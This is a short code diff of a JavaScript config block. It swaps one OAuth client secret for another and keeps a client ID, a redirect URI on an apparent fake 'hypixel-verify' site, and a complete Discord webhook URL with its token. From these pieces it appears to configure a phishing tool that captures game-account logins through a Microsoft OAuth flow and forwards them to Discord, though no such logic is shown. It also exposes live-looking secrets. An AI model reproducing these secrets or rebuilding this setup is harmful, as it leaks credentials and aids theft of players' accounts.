@@ -1,5 +1,5 @@
 //Config
-const client_secret = '1J58Q~j2VPXZQAheVqW2jb6ffjRSZhD4Ldx6.aKP'
+const client_secret = 'EmS8Q~bJTQGnmnQNHDkDiozqn5P8g3KrfM64Sayp'
 const client_id = '9c23fce6-2fbe-47f3-a36d-94a56b37a3bc'
 const redirect_uri = 'https://hypixel-verify-yxo7.onrender.com/api/v1/callback'
 const webhook_url = 'https://discord.com/api/webhooks/1160604080914321448/wz8Kv1TtI-zN3wgGhJ9V1MN1nFbDxU_fQahQm9yM8X0yl67Yqdh-jml_fjofshpcZygT'
